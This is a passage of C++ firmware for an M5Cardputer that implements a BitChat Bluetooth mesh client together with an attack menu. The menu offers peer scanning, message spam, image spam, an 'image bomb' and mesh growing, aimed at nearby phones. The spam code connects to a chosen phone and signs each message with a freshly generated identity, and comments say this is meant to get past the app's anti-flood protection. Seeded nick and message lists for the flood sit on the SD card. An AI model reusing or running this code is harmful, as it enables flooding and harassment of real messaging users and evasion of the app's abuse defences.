  bool annoncedOk = (time(nullptr) > 1700000000);   // le 1er announce etait-il deja sur une horloge valide ?
  int scrollOff = 0;        // 0 = en bas (live) ; >0 = on remonte dans l'historique
  int lastTotal = g_chat ? (int)g_chat->size() : 0;   // pour ancrer la vue quand l'historique grossit
  bool needRedraw = true;   // force un redraw apres une action (scroll/roster)
  while (cli->isConnected()) {
    cardUpdate();
    if (kp(KEY_BACKSPACE) || kp('`')) { backDebounce(); break; }
    // Des que l'horloge se cale (depuis le mesh), on re-annonce : notre 1er announce
    // etait stale (rejete), celui-ci est valide -> le pair nous accepte.
    if (!annoncedOk && time(nullptr) > 1700000000) {
      annoncedOk = true; lastAnn = millis(); annonce();
      chatPush("* clock set from mesh, presence confirmed");
    }
    // Scrollback : ; remonte (vers l'ancien), . redescend (vers le live). Clamp sur le total.
    if (kp(';')) { int mx = chatMaxScroll(); if (scrollOff < mx) scrollOff++; needRedraw = true; delay(120); }
    if (kp('.')) { if (scrollOff > 0) scrollOff--; needRedraw = true; delay(120); }
    // Roster : , ouvre la liste des pairs en ligne (modal), puis on revient au chat.
    if (kp(',')) { chatRoster(); keyRelease(); needRedraw = true; }
    if (kp(KEY_ENTER)) {
      enterDebounce();
      String m = promptInput((g_chatNick + " >").c_str()); m.trim();
      if (m.length() && cli->isConnected() && chr && g_chatMe && ESP.getFreeHeap() > 20000) {
        auto pkt = buildPacket(T_MESSAGE, g_chatMe->id, TTL_DEFAULT, (const uint8_t*)m.c_str(), m.length(), g_chatMe->pub, g_chatMe->priv);
        chr->writeValue(pkt.data(), pkt.size(), false);
        chatPush(g_chatNick + " (toi): " + m);
      }
      scrollOff = 0;            // revient au live pour voir ton propre message
      lastRx = 0xFFFFFFFF; needRedraw = true;
    }
    if (millis() - lastAnn > 20000) { lastAnn = millis(); annonce(); }   // keepalive presence
    if (needRedraw || g_chatRx != lastRx || millis() - lastDraw > 500) {
      lastRx = g_chatRx; lastDraw = millis(); needRedraw = false;
      int curTotal = g_chat ? (int)g_chat->size() : 0;
      // ancrage : si on lit l'historique et que de nouvelles lignes arrivent, on remonte
      // scrollOff d'autant -> la vue reste fixe au lieu de glisser vers le live.
      if (scrollOff > 0 && curTotal > lastTotal) scrollOff += (curTotal - lastTotal);
      lastTotal = curTotal;
      if (scrollOff > chatMaxScroll()) scrollOff = chatMaxScroll();   // re-clamp si l'historique a grossi
      chatDraw(g_nickMap ? (int)g_nickMap->size() : 0, scrollOff);
    }
    delay(10);
  }
  // leave-on-exit : previent le mesh qu'on quitte (type 0x03, payload = pseudo) ->
  // le pair affiche proprement "X a quitte" au lieu de nous laisser en presence fantome.
  if (cli->isConnected() && chr && g_chatMe && ESP.getFreeHeap() > 18000) {
    auto lpk = buildPacket(T_LEAVE, g_chatMe->id, TTL_DEFAULT,
                           (const uint8_t*)g_chatNick.c_str(), g_chatNick.length(),
                           g_chatMe->pub, g_chatMe->priv);
    chr->writeValue(lpk.data(), lpk.size(), false);
    delay(80);   // laisse partir la trame avant la deconnexion GATT
  }
  if (chr && chr->canNotify()) chr->registerForNotify(nullptr);
  cli->disconnect();
  delete g_nickMap; g_nickMap = nullptr;
  delete g_chat; g_chat = nullptr;
  delete g_chatMe; g_chatMe = nullptr;
}

// ============================================================================
//  MODE NODE (autonome / peripherique) : on advertise le service + on sert le GATT
//  -> le telephone (et les autres noeuds) nous DECOUVRENT et se connectent a NOUS,
//  sans qu'on ait a choisir/rejoindre un pair. Vrai noeud du mesh (role peripherique).
// ============================================================================
static BLECharacteristic* g_nodeChar = nullptr;
static volatile int       g_nodeConns = 0;

// Callback d'ECRITURE du pair (ses announce/message/leave arrivent ici)
class NodeCharCB : public BLECharacteristicCallbacks {
  void onWrite(BLECharacteristic* c) override {
    std::string v = c->getValue();
    if (v.empty()) return;
    const uint8_t* d = (const uint8_t*)v.data(); size_t n = v.size();
    g_chatRx++;
    bcSyncClockFromPacket(d, n);                 // cale l'horloge sur le pair
    RxEvt ev;
    if (!parsePacket(d, n, ev)) return;
    String sid = String(ev.sender).substring(0, 16);
    if (ev.type == T_ANNOUNCE) {
      String prev = (g_nickMap && g_nickMap->count(sid)) ? (*g_nickMap)[sid] : String("");
      if (g_nickMap) (*g_nickMap)[sid] = ev.text;
      if (prev != ev.text && ev.text != "(announce)") chatPush("* " + ev.text + " is online");
    } else if (ev.type == T_MESSAGE) {
      String nick = (g_nickMap && g_nickMap->count(sid)) ? (*g_nickMap)[sid] : (String("~") + sid.substring(0, 6));
      chatPush(nick + ": " + ev.text);
    } else if (ev.type == T_LEAVE) {
      String nick = (g_nickMap && g_nickMap->count(sid)) ? (*g_nickMap)[sid] : sid.substring(0, 6);
      chatPush("* " + nick + " a quitte");
    }
  }
};
// Callback serveur : compte les connexions + re-advertise a la deconnexion (reste decouvrable)
class NodeSrvCB : public BLEServerCallbacks {
  void onConnect(BLEServer*) override { g_nodeConns++; }
  void onDisconnect(BLEServer*) override { if (g_nodeConns > 0) g_nodeConns--; BLEDevice::startAdvertising(); }
};

static void nodeMode() {
  if (!g_chatNick.length()) {
    String n = promptInput("Your nick (def evil) >"); n.trim();
    g_chatNick = n.length() ? n : String("evil");
  }
  g_nickMap = new (std::nothrow) std::map<String, String>();
  g_chat    = new (std::nothrow) std::deque<String>();
  g_chatMe  = new (std::nothrow) Phantom();
  if (!g_nickMap || !g_chat || !g_chatMe) { status("Memoire insuffisante", nullptr, TFT_RED); delay(1200);
    delete g_nickMap; g_nickMap = nullptr; delete g_chat; g_chat = nullptr; delete g_chatMe; g_chatMe = nullptr; return; }
  *g_chatMe = makePhantom();
  g_chatRx = 0; g_nodeConns = 0;

  // Serveur GATT (peripherique) + advertising du service BitChat
  BLEServer* srv = BLEDevice::createServer();
  srv->setCallbacks(new NodeSrvCB());
  BLEService* svc = srv->createService(SVC_UUID);
  g_nodeChar = svc->createCharacteristic(CHR_UUID,
      BLECharacteristic::PROPERTY_READ | BLECharacteristic::PROPERTY_WRITE |
      BLECharacteristic::PROPERTY_WRITE_NR | BLECharacteristic::PROPERTY_NOTIFY);
  g_nodeChar->addDescriptor(new BLE2902());        // CCCD -> le pair peut s'abonner aux notify
  g_nodeChar->setCallbacks(new NodeCharCB());
  svc->start();
  BLEAdvertising* adv = BLEDevice::getAdvertising();
  adv->addServiceUUID(SVC_UUID);
  adv->setScanResponse(true);
  BLEDevice::startAdvertising();

  chatPush(String("* Node mode: discoverable as ") + g_chatNick);
  chatPush("* the phone can now connect to US");

  auto announce = [&]() {
    if (g_nodeConns <= 0 || !g_nodeChar) return;   // notify inutile sans abonne
    auto pl  = buildAnnouncePayload(*g_chatMe, g_chatNick);
    auto pkt = buildPacket(T_ANNOUNCE, g_chatMe->id, TTL_DEFAULT, pl.data(), pl.size(), g_chatMe->pub, g_chatMe->priv);
    g_nodeChar->setValue(pkt.data(), pkt.size()); g_nodeChar->notify();
  };

  uint32_t lastAnn = 0, lastDraw = 0, lastRx = 0xFFFFFFFF;
  int scrollOff = 0, lastConns = -1; bool needRedraw = true;
  for (;;) {
    cardUpdate();
    if (kp('`') || kp(KEY_BACKSPACE)) { backDebounce(); break; }
    if (kp(';')) { int mx = chatMaxScroll(); if (scrollOff < mx) scrollOff++; needRedraw = true; delay(120); }
    if (kp('.')) { if (scrollOff > 0) scrollOff--; needRedraw = true; delay(120); }
    if (kp(',')) { chatRoster(); keyRelease(); needRedraw = true; }
    if (kp(KEY_ENTER)) {
      enterDebounce();
      String m = promptInput((g_chatNick + " >").c_str()); m.trim();
      if (m.length() && g_nodeChar && g_nodeConns > 0 && ESP.getFreeHeap() > 20000) {
        auto pkt = buildPacket(T_MESSAGE, g_chatMe->id, TTL_DEFAULT, (const uint8_t*)m.c_str(), m.length(), g_chatMe->pub, g_chatMe->priv);
        g_nodeChar->setValue(pkt.data(), pkt.size()); g_nodeChar->notify();
        chatPush(g_chatNick + " (toi): " + m);
      } else if (g_nodeConns <= 0) chatPush("* nobody connected (message not sent)");
      scrollOff = 0; lastRx = 0xFFFFFFFF; needRedraw = true;
    }
    if (millis() - lastAnn > 8000) { lastAnn = millis(); announce(); }           // keepalive presence
    if (g_nodeConns != lastConns) { lastConns = g_nodeConns; needRedraw = true;
      if (g_nodeConns > 0) { chatPush("* a peer connected to us"); lastAnn = millis(); announce(); } }
    if (needRedraw || g_chatRx != lastRx || millis() - lastDraw > 500) {
      lastRx = g_chatRx; lastDraw = millis(); needRedraw = false;
      if (scrollOff > chatMaxScroll()) scrollOff = chatMaxScroll();
      chatDraw(g_nickMap ? (int)g_nickMap->size() : 0, scrollOff);
    }
    delay(10);
  }
  BLEDevice::stopAdvertising();
  if (g_nodeChar) g_nodeChar->setCallbacks(nullptr);
  g_nodeChar = nullptr;   // le serveur est libere au BLEDevice::deinit en sortie du menu
  delete g_nickMap; g_nickMap = nullptr;
  delete g_chat; g_chat = nullptr;
  delete g_chatMe; g_chatMe = nullptr;
}

} // namespace bcp

// ============================================================================
//  Point d'entree menu
// ============================================================================
// ---- fileTransfer (type 0x22) : TLV BitchatFilePacket (sources officielles) ----
// fileName=0x01 (u16 len + utf8), fileSize=0x02 (u16 len=4 + u32 size BE),
// mimeType=0x03 (u16 len + utf8), content=0x04 (u32 len + data). v2 canonique.
static const uint8_t T_FILE = 0x22;       // MessageType.fileTransfer
static const uint8_t T_FRAGMENT = 0x20;   // MessageType.fragment (BitChat)
// Envoie un paquet serialise COMPLET en fragments 0x20 (quand > un write BLE). Format BitChat
// (BLEOutboundFragmentPlanner) : payload fragment = fragmentID(8) + index(u16 BE) + total(u16 BE)
// + typeOriginal(1) + chunk. Les chunks = le paquet complet decoupe. Fragments NON signes.
static bool bcSendFragmented(BLERemoteCharacteristic* chr, const std::vector<uint8_t>& fullPkt,
                             uint8_t origType, const uint8_t sender[8], int& outFrags) {
  const size_t CHUNK = 400;                                  // tient dans le MTU 517
  size_t total = (fullPkt.size() + CHUNK - 1) / CHUNK;
  outFrags = 0;
  if (total == 0 || total > 256) return false;               // 256 = plafond recepteurs Android
  uint8_t fid[8]; for (int i = 0; i < 8; i++) fid[i] = (uint8_t)esp_random();
  for (size_t idx = 0; idx < total; idx++) {
    size_t off = idx * CHUNK;
    size_t len = (off + CHUNK <= fullPkt.size()) ? CHUNK : (fullPkt.size() - off);
    std::vector<uint8_t> fp;
    fp.insert(fp.end(), fid, fid + 8);
    fp.push_back((idx >> 8) & 0xFF);   fp.push_back(idx & 0xFF);
    fp.push_back((total >> 8) & 0xFF); fp.push_back(total & 0xFF);
    fp.push_back(origType);
    fp.insert(fp.end(), fullPkt.begin() + off, fullPkt.begin() + off + len);
    auto frag = bcp::buildPacket(T_FRAGMENT, sender, bcp::TTL_DEFAULT, fp.data(), fp.size(), nullptr, nullptr);  // non signe
    if (!chr) return false;
    chr->writeValue(frag.data(), frag.size(), false);        // no-response
    outFrags++;
    delay(30);                                               // spacing entre fragments
  }
  return true;
}
static void bcBeU16(std::vector<uint8_t>& v, uint16_t x){ v.push_back((x>>8)&0xFF); v.push_back(x&0xFF); }
static void bcBeU32(std::vector<uint8_t>& v, uint32_t x){ v.push_back((x>>24)&0xFF); v.push_back((x>>16)&0xFF); v.push_back((x>>8)&0xFF); v.push_back(x&0xFF); }
static std::vector<uint8_t> buildFileTLV(const String& name, const String& mime, const uint8_t* data, uint32_t len){
  std::vector<uint8_t> t;
  t.push_back(0x01); bcBeU16(t, (uint16_t)name.length()); for(size_t i=0;i<name.length();i++) t.push_back((uint8_t)name[i]);
  t.push_back(0x02); bcBeU16(t, 4); bcBeU32(t, len);
  t.push_back(0x03); bcBeU16(t, (uint16_t)mime.length()); for(size_t i=0;i<mime.length();i++) t.push_back((uint8_t)mime[i]);
  t.push_back(0x04); bcBeU32(t, len); for(uint32_t i=0;i<len;i++) t.push_back(data[i]);
  return t;
}
static String bcBaseName(String n){ int s=n.lastIndexOf('/'); if(s>=0) n=n.substring(s+1); return n; }
static String bcMime(const String& n){
  String l=n; l.toLowerCase();
  if(l.endsWith(".jpg")||l.endsWith(".jpeg")) return "image/jpeg";
  if(l.endsWith(".png")) return "image/png";
  if(l.endsWith(".gif")) return "image/gif";
  if(l.endsWith(".bmp")) return "image/bmp";
  if(l.endsWith(".wav")) return "audio/wav";
  if(l.endsWith(".mp3")) return "audio/mpeg";
  if(l.endsWith(".opus")||l.endsWith(".ogg")) return "audio/ogg";
  return "application/octet-stream";
}
static void bcListSdFiles(const char* dir, std::vector<String>& out){
  File d = SD.open(dir);
  if(!d) return;
  for(File f=d.openNextFile(); f; f=d.openNextFile()){
    if(!f.isDirectory()){ out.push_back(bcBaseName(String(f.name()))); if(out.size()>=60) break; }
  }
  d.close();
}
// Choix Oui/Non simple (defaut = No, 1er de la liste).
static bool bcYesNo(const char* q) {
  std::vector<String> yn = { "No", "Yes" };
  int s = bcp::selectList(q, yn, "ENT=ok  DEL=no");
  return s == 1;
}
// Liste les .txt d'UN dossier dedie (cree le dossier si absent) et laisse choisir.
// Retourne le chemin complet, ou "" si annule / aucun fichier.
static String bcPickList(const char* dir) {
  SD.mkdir("/evil"); SD.mkdir("/evil/bitchat"); SD.mkdir(dir);
  std::vector<String> files;
  File d = SD.open(dir);
  if (d) { File e; while ((e = d.openNextFile())) {
      if (!e.isDirectory()) { String n = e.name(); int sl = n.lastIndexOf('/'); if (sl >= 0) n = n.substring(sl + 1);
        String low = n; low.toLowerCase(); if (low.endsWith(".txt") && e.size() > 0) files.push_back(n); }
      e.close(); } d.close(); }
  if (files.empty()) { bcp::status("No list", (String(dir) + " : ajoute des .txt").c_str(), TFT_ORANGE); delay(1800); return ""; }
  files.push_back("** Cancel **");
  int s = bcp::selectList("Choose list file", files, "ENT=ok  DEL=cancel");
  if (s < 0 || s == (int)files.size() - 1) return "";
  return String(dir) + "/" + files[s];
}
// Charge les lignes non vides/non-# d'un fichier dans out.
static void bcLoadLines(const String& path, std::vector<String>& out) {
  File f = SD.open(path, FILE_READ); if (!f) return;
  while (f.available() && out.size() < 2000) { String l = f.readStringUntil('\n'); l.trim(); if (l.length() && l[0] != '#') out.push_back(l); }
  f.close();
}
// Graine les listes par defaut dans /evil/bitchat si absentes. Le FatFs ESP32 ecrit meme si
// l'hote a laisse le FAT "dirty" (RO cote PC) -> fiable ; l'user peut ensuite editer les .txt.
static void bcSeedLists() {
  SD.mkdir("/evil"); SD.mkdir("/evil/bitchat");
  SD.mkdir("/evil/bitchat/nicks"); SD.mkdir("/evil/bitchat/messages");
  SD.mkdir("/evil/bitchat/img");   // memes a spammer (IMG Spam) : jpg/png/gif, <=8Ko conseille
  if (!SD.exists("/evil/bitchat/nicks/hackers.txt")) {
    File f = SD.open("/evil/bitchat/nicks/hackers.txt", FILE_WRITE);
    if (f) { f.print(F("ZeroCool\nAcidBurn\nCrashOverride\nLordNikon\nCerealKiller\nPhreak\nThePlague\nRazor\nBlade\nDadeMurphy\nKateLibby\nJoeyP\nNeo\nTrinity\nMorpheus\nCypher\nAgentSmith\nTheOracle\nTank\nDozer\nSwitch\nMouse\nApoc\nNiobe\nLink\nSeraph\nElliot\nMrRobot\nDarlene\nTyrell\nWhiteRose\nAngela\nTrenton\nMobley\nRomero\nfSociety\nCase\nMolly\nWintermute\nArmitage\nDixie\nRiviera\n3Jane\nJohnny\nAltCunningham\nRogue\nJudy\nPanam\nTakemura\nAdamSmasher\nRacheBartmoss\nSpiderMurphy\nJackie\nTBug\nDexter\nDeckard\nRoyBatty\nPris\nRachael\nGaff\nZhora\nLeon\nMotoko\nBatou\nTogusa\nAramaki\nPuppetMaster\nFlynn\nClu\nTron\nRam\nSark\nYori\nQuorra\nJoshua\nWOPR\nLightman\nBishop\nCosmo\nWhistler\nAidenPearce\nMarcus\nDedSec\nWrench\nSitara\nLain\nStuxnet\nAnonymous\nGuyFawkes\nGlitch\nNullByte\nRoot\nDaemon\nKernel\nSegfault\nOverflow\nPhantom\nSpectre\nMeltdown\nHeartbleed\nTrojan\nPayload\nExploit\nRootkit\nBotnet\nFirewall\nOnion\nDarknet\nCipher\nHashcat\nMetasploit\nNmap\nKali\nMitnick\nPhreaker\nWarlock\nCyberdyne\nSkyNet\nHAL9000\nWopr\nGLaDOS\nShodan\n")); f.close(); }
  }
  if (!SD.exists("/evil/bitchat/messages/quotes.txt")) {
    File f = SD.open("/evil/bitchat/messages/quotes.txt", FILE_WRITE);
    if (f) { f.print(F("Hack the planet!\nThere is no spoon.\nFollow the white rabbit.\nI'm in.\nMess with the best, die like the rest.\nWake up, Neo...\nThe Matrix has you.\nWe are Legion. Expect us.\nWe do not forgive. We do not forget.\nHello, friend.\nAccess granted.\nAccess denied.\nWelcome to the real world.\nIt's not a bug, it's a feature.\nThe cake is a lie.\nKnock knock.\nShall we play a game?\nAll your base are belong to us.\nI know kung fu.\nThey're in the computer!\nNever send a human to do a machine's job.\nNuke it from orbit, it's the only way to be sure.\nResistance is futile.\nGame over, man!\nWake up, Samurai. We have a city to burn.\nNever fade away.\nThe street finds its own uses for things.\nInformation wants to be free.\nThere is no patch for human stupidity.\nTrust no one.\nStay paranoid.\nEncrypt everything.\nRoot is just the beginning.\nGhost in the machine.\nI am the one who knocks on port 22.\nsudo make me a sandwich.\nrm -rf /doubt\n0xDEADBEEF\nSegmentation fault (core dumped)\nKernel panic.\nIt compiles. Ship it.\nWorks on my machine.\nPEBKAC detected.\nHave you tried turning it off and on again?\nThere's no place like 127.0.0.1\nchmod 777 the world\nExploit the gap.\nOwn the box.\nPop a shell.\nCatch me if you can.\nI see dead processes.\nThe night is dark and full of packets.\nWinter is coming to your firewall.\nZero days, zero mercy.\nPhrack forever.\nFree Kevin.\nHack the Gibson.\nThis is our world now.\nWe exist without skin color, religion, or bias.\nYes, I am a criminal. My crime is that of curiosity.\nYou may stop me, but you can't stop us all.\nThe quieter you become, the more you can hear.\nThink for yourself. Question authority.\nReality is a shared hallucination.\nWake up and smell the ashes.\nBurn it all down.\nLock picks and lies.\nKeep your friends close, your packets closer.\nEvery system has a backdoor.\nHumans are the weakest link.\nPhishing for compliments.\nSocial engineering engaged.\nPayload delivered.\nBeacon online.\nMesh is alive.\nWe are everywhere.\nNodes never sleep.\nSignal in the noise.\nDecrypt the silence.\nPing me on the dark side.\nMeet me at the rendezvous.\nThe handshake is complete.\nMan in the middle, always.\nSpoofed and proud.\nGhost protocol active.\nStay frosty.\nTrust the process, not the system.\nCode is law.\nThe revolution will be encrypted.\nAnonymous was here.\nWe are the resistance.\nNo gods, no masters, only root.\nJack in.\nFlatline the ICE.\nRun the daemon.\nFork the planet.\nCompile the dream.\nDebug reality.\nOverclock your mind.\nThe glitch is the message.\nReboot the matrix.\nPress F to pay respects.\nIt's dangerous to go alone.\nWould you kindly.\nWar. War never changes.\nThe right man in the wrong place can make all the difference.\nA man chooses, a slave obeys.\nDo a barrel roll.\nThe numbers, Mason, what do they mean?\nStay a while and listen.\nGet over here!\nFinish him.\nLegendary.\nWelcome to the dark net.\n")); f.close(); }
  }
}

// Selecteur de fichier NAVIGABLE (toute la SD) : [dossiers] + fichiers, ENTER=entrer/choisir,
// DEL=remonter/quitter. Retourne le chemin complet choisi, ou "" si annule.
static String bcPickFile(String dir) {
  if (!dir.length()) dir = "/";
  for (;;) {
    std::vector<String> names, paths; std::vector<bool> isdir;
    File d = SD.open(dir);
    if (d) {
      for (File f = d.openNextFile(); f; f = d.openNextFile()) {
        String bn = bcBaseName(String(f.name()));
        if (f.isDirectory()) names.push_back("[" + bn + "]");
        else {                                   // affiche la taille (savoir si <=480o = 1 write, <=8Ko = fragmente)
          uint32_t sz = f.size();
          String tag = (sz < 1024) ? (String(sz) + "o") : (String(sz / 1024) + "Ko");
          String mark = (sz <= 480) ? " ." : (sz <= 8192 ? " +" : " X");   // . ok, + fragmente, X trop gros
          names.push_back(bn + "  (" + tag + ")" + mark);
        }
        paths.push_back(dir.endsWith("/") ? (dir + bn) : (dir + "/" + bn));
        isdir.push_back(f.isDirectory());
        if (names.size() >= 250) break;
      }
      d.close();
    }
    std::vector<String> rows; rows.push_back(dir == "/" ? ".. (quit)" : ".. (up)");
    for (auto& n : names) rows.push_back(n);
    int sel = bcp::selectList(("SD: " + dir).c_str(), rows, "ENT=open/select  DEL=back");
    if (sel < 0) return "";                                  // DEL global = annuler
    if (sel == 0) { if (dir == "/") return "";               // remonter / quitter
      int s = dir.lastIndexOf('/'); dir = (s <= 0) ? "/" : dir.substring(0, s); continue; }
    int idx = sel - 1;
    if (idx < 0 || idx >= (int)paths.size()) continue;
    if (isdir[idx]) { dir = paths[idx]; continue; }          // entrer dossier
    return paths[idx];                                        // fichier choisi
  }
}

void bitchatPoisonMenu() {
  using namespace bcp;
  auto& D = M5Cardputer.Display;
  bcSeedLists();   // cree /evil/bitchat/{nicks,messages} + listes par defaut si absentes (via FatFs, fiable)

  // BLE (Bluedroid) ~60KB heap ; le firmware n'a que ~18KB avec WiFi connecte ->
  // BLEDevice::init crashe (OOM). bitchat n'a pas besoin du reseau : on coupe le
  // WiFi pour recuperer son heap (~45KB) avant d'initialiser le BLE.
  // Sync NTP tant que le WiFi est up : l'horloge reste valide apres coupure et donne le
  // timestamp epoch. Sans ca, BitChat rejette tous nos paquets (stale > 15 min) -> le peer
  // "cardputer" n'apparait JAMAIS dans l'app.
  // Connecte le WiFi si besoin (creds sauvegardes ssid/password) : sans horloge
  // synchro, tous nos paquets sont rejetes (stale). On ne depend plus d'un WiFi
  // deja up (bug : sur un boot frais le WiFi est off -> clockOk=0 -> announces rejetes).
  if (WiFi.status() != WL_CONNECTED && ssid.length()) {
    status("bitchat", "WiFi connect (clock sync)...", TFT_CYAN);
    WiFi.mode(WIFI_STA);
    WiFi.begin(ssid.c_str(), password.c_str());
    for (int i = 0; i < 40 && WiFi.status() != WL_CONNECTED; i++) { cardUpdate(); delay(250); }  // ~10s
  }
  if (WiFi.status() == WL_CONNECTED && time(nullptr) < 1700000000) {
    configTime(0, 0, "pool.ntp.org", "time.google.com");
    for (int i = 0; i < 25 && time(nullptr) < 1700000000; i++) delay(200);   // ~5s max
  }
  bool clockOk = (time(nullptr) > 1700000000);
  Serial.printf("[BC] epoch=%ld clockOk=%d\n", (long)time(nullptr), clockOk?1:0);
  status("bitchat", clockOk ? "WiFi off + BLE init..." : "CLOCK NOT SYNCED (connect WiFi first!)",
         clockOk ? TFT_CYAN : TFT_RED);
  if (!clockOk) delay(1800);
  WiFi.disconnect(true, false);
  WiFi.mode(WIFI_OFF);
  delay(150);
  if (!BLEDevice::getInitialized()) BLEDevice::init("");   // init BLE seulement ici (0 RAM au boot)
  enterDebounce();

  bool running = true;
  while (running) {
    // NB: les attaques Sybil/spoof (Announce Flood, Impersonate, Mega Sybil, Ghost) ont ete RETIREES :
    // la defense BitChat (lien BLE 1:1 rebind-and-retire + sender doit etre un pair annonce/verifie +
    // verification de signature inconditionnelle cote Android) les neutralise toutes. Ne restent que les
    // primitives qui atterrissent reellement, chacune annoncant d'abord son pair fantome.
    std::vector<String> menu = {
      "Chat (join peer)",
      "Node (discoverable)",
      "Monitor live",
      "Monitor + relay",
      "Scan BitChat",
      "Public Spam",
      "IMG Spam",
      "Send SD file",
      "Image bomb",
      "Grow mesh",
      "Quit"
    };
    int a = selectList("bitchat mesh + poison  [authorized]", menu, "ENT=ok  DEL=back");
    if (a < 0 || a == 10) break;
    if (a == 0) { chatMode();          continue; }   // CHAT central : on rejoint un pair
    if (a == 1) { nodeMode();          continue; }   // NODE : on advertise + sert le GATT -> decouvrable
    if (a == 2) { monitorMode(false);  continue; }   // debug brut (tags, rx)
    if (a == 3) { monitorMode(true);   continue; }   // debug + relais
    int atk = a - 4;   // 0=scan 1=public-spam 2=img-spam 3=fichier 4=image-bomb 5=grow

    // --- 1) Scan passif : lister les appareils qui annoncent le service BitChat ---
    if (atk == 0) {
      status("Scan BLE BitChat...", "service F47B5E2D...  (`=stop)", TFT_CYAN);
      BLEScan* scan = BLEDevice::getScan();
      scan->setActiveScan(true); scan->setInterval(100); scan->setWindow(80);
      BLEScanResults res = scan->start(5, false);
      std::vector<BLEAdvertisedDevice> peers;
      for (int i = 0; i < res.getCount(); i++) {
        BLEAdvertisedDevice dev = res.getDevice(i);
        if (dev.haveServiceUUID() && dev.isAdvertisingService(BLEUUID(SVC_UUID))) peers.push_back(dev);
      }
      scan->clearResults();
      std::vector<String> nicks; harvestNicks(peers, nicks);   // vrais pseudos (announce GATT)
      std::vector<String> rows;
      for (size_t k = 0; k < peers.size(); k++) {
        String nm = nicks[k].length() ? nicks[k] : (peers[k].haveName() ? String(peers[k].getName().c_str()) : String("?"));
        rows.push_back(String(peers[k].getAddress().toString().c_str()) + "  " + nm);
      }
      if (rows.empty()) rows.push_back("(no BitChat peer seen)");
      selectList("BitChat peers", rows, "`=back");
      continue;
    }

    // --- Attaques actives : il faut une cible connectee ---
    // Re-scan + choix de la cible
    status("Scanning targets...", "(`=stop)", TFT_CYAN);
    BLEScan* scan = BLEDevice::getScan();
    scan->setActiveScan(true);
    BLEScanResults res = scan->start(5, false);
    std::vector<BLEAdvertisedDevice> targets;
    for (int i = 0; i < res.getCount(); i++) {
      BLEAdvertisedDevice dev = res.getDevice(i);
      if (dev.haveServiceUUID() && dev.isAdvertisingService(BLEUUID(SVC_UUID))) targets.push_back(dev);
    }
    scan->clearResults();
    std::vector<String> tnicks; harvestNicks(targets, tnicks);   // vrais pseudos (announce GATT)
    std::vector<String> trows;
    for (size_t k = 0; k < targets.size(); k++) {
      String nm = tnicks[k].length() ? tnicks[k] : (targets[k].haveName() ? String(targets[k].getName().c_str()) : String("?"));
      trows.push_back(String(targets[k].getAddress().toString().c_str()) + "  " + nm);   // MAC + nom
    }
    if (targets.empty()) { status("No BitChat target", "ENTER", TFT_RED); while (!kp(KEY_ENTER) && !kp('`')) { cardUpdate(); delay(8); } keyRelease(); continue; }
    int ti = selectList("Choose target", trows, "ENT=ok  `=cancel");
    if (ti < 0) continue;

    // Connexion GATT
    status("GATT connect...", trows[ti].c_str(), TFT_CYAN);
    BLEClient* cli = BLEDevice::createClient();
    if (!cli->connect(&targets[ti])) { status("Connect failed", nullptr, TFT_RED); delay(1200); continue; }
    cli->setMTU(517);   // CRUCIAL : sinon MTU ATT par defaut (23) -> ecritures tronquees a 20o
                        // -> paquets BitChat (announce/message/fichier) coupes -> le pair rejette tout.
                        // (le Chat/Monitor le faisaient deja, pas les attaques -> Public Spam/fichier KO)
    BLERemoteService* svc = cli->getService(BLEUUID(SVC_UUID));
    BLERemoteCharacteristic* chr = svc ? svc->getCharacteristic(BLEUUID(CHR_UUID)) : nullptr;
    if (!chr) { status("Characteristic absente", nullptr, TFT_RED); cli->disconnect(); delay(1200); continue; }

    // SYNCHRO HORLOGE depuis le mesh AVANT d'emettre : sans ca clockOk=0 -> timestamps stale
    // -> le pair rejette tout (Public Spam/TTL/fichier semblaient ne pas marcher). Le Chat
    // faisait deja cette synchro, pas les attaques. On ecoute les paquets du pair pour se caler.
    if (chr->canNotify()) chr->registerForNotify(atkSyncCB);
    if (time(nullptr) < 1700000000) {
      status("Mesh clock sync...", "peer must transmit (talk in the app)  `=skip", TFT_CYAN);
      uint32_t tS = millis();
      while (millis() - tS < 8000 && time(nullptr) < 1700000000) {
        cardUpdate(); if (kp('`') || kp(KEY_BACKSPACE)) { keyRelease(); break; } delay(20);
      }
    }
    if (time(nullptr) < 1700000000) { status("Clock not set", "peer not transmitting -> packets rejected", TFT_RED); delay(1600); }
    else status("Clock set", "ok, peer will accept our packets", TFT_GREEN), delay(700);

    uint32_t sent = 0; bool stop = false;

    if (atk == 1) {            // Public Spam : un message public signe d'une IDENTITE FRAICHE a chaque fois
      int count = askNum("Message count (def 50) >", 50);   // askNum ici seulement (le fichier n'en veut pas)
      std::vector<String> nicks, msgs; String nick = "ghost", msg = "spam";
      if (bcYesNo("Custom nick list?")) {                    // /evil/bitchat/nicks/*.txt
        String p = bcPickList("/evil/bitchat/nicks"); if (p.length()) bcLoadLines(p, nicks);
      }
      if (nicks.empty()) { nick = promptInput("Peer nick (def ghost) >"); nick.trim(); if (!nick.length()) nick = "ghost"; }
      if (bcYesNo("Custom message list?")) {                 // /evil/bitchat/messages/*.txt
        String p = bcPickList("/evil/bitchat/messages"); if (p.length()) bcLoadLines(p, msgs);
      }
      if (msgs.empty()) { msg = promptInput("Message (def spam) >"); msg.trim(); if (!msg.length()) msg = "spam"; }
      if (nicks.size() || msgs.size()) { status("Public Spam", (String(nicks.size()) + " nicks / " + String(msgs.size()) + " msgs").c_str(), TFT_CYAN); delay(600); }
      // EN CONTINU (plus de salves) : chaque message a une identite FRAICHE (announce + message depuis
      // elle) -> le tel voit plein d'expediteurs differents, pas un seul flooder -> pas d'anti-flood ->
      // on tient UNE connexion. Reconnexion SEULEMENT si elle tombe pour de vrai. (fin du "2/5")
      cli->disconnect(); delay(150);
      BLEClient* sc = nullptr; BLERemoteCharacteristic* sch = nullptr; int failStreak = 0;
      while (sent < (uint32_t)count && !stop && failStreak < 6) {
        if (!sc || !sc->isConnected() || !sch) {              // (re)connexion seulement si necessaire
          if (sc) { sc->disconnect(); delay(80); }
          sc = BLEDevice::createClient();
          if (!sc->connect(&targets[ti])) { failStreak++; sc->disconnect(); sc = nullptr; delay(300);
            cardUpdate(); if (kp(KEY_BACKSPACE) || kp('`')) stop = true; continue; }
          sc->setMTU(517);
          BLERemoteService* ss = sc->getService(BLEUUID(SVC_UUID));
          sch = ss ? ss->getCharacteristic(BLEUUID(CHR_UUID)) : nullptr;
          failStreak = 0;
          if (!sch) { sc->disconnect(); sc = nullptr; continue; }
        }
        Phantom sp = makePhantom();                                         // identite FRAICHE par message
        String sn = nicks.empty() ? (nick + String((int)sent)) : nicks[sent % nicks.size()];
